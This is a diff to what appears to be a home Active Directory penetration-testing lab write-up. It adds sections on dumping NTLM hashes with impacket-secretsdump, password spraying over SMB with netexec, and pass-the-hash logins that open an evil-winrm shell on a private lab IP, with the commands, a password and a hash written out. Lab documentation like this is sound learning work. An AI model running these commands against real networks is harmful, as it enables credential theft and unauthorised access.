@@ -130,11 +130,63 @@ evil-winrm -i 192.168.141.129 -u Administrator -p Password1
 
 # 4. Domain Credential Extraction
 
+## Objective
+
+Demonstrate the impact of compromised Domain Controller privileges.
+
+With administrative privileges, an attacker can extract password hashes from Active Directory.
+
+### Secretsdump
+```
+impacket-secretsdump DOMAIN.local/Administrator:Password1@192.168.141.129
+```
+
+![secretsdump](Images/secretsdump.png)
+
+The dump retrieved NTLM hashes for domain accounts including:
+- Administrator
+- pparker
+- jsmith
+- SQLService
+
+These hashes can potentially be cracked or used for pass-the-hash attacks.
+
 # 5. Password Spraying
 
-# 6. Service Account Attacks
+## Objective
 
-# 7. Pass-the-Hash
+Test whether users are vulnerable to weak or reused passwords.
+
+After obtaining valid usernames, password spraying can be performed against domain services.
+
+## SMB Password Spray
+```
+netexec smb 192.168.141.0/24 -u users.txt -p Password1 --continue-on-success
+```
+
+![spray](Images/spray.png)
+
+The test identified valid credentials which could potentially provide access to domain resources.
+
+# 6. Pass-the-Hash
+
+## Objective
+
+Demonstrate authentication using an NTLM hash instead of recovering the plaintext password.
+
+Authenticate using hash
+```
+netexec winrm 192.168.141.129 -u SQLService -H f4ab68f27303bcb4024650d8fc5f973a
+```
+
+[verify](Images/verify.png)
+
+Obtain WinRM shell
+```
+evil-winrm -i 192.168.141.129 -u SQLService -H f4ab68f27303bcb4024650d8fc5f973a
+```
+
+![shell](Images/shell.png)
 
 # Future Lab Expansion
 
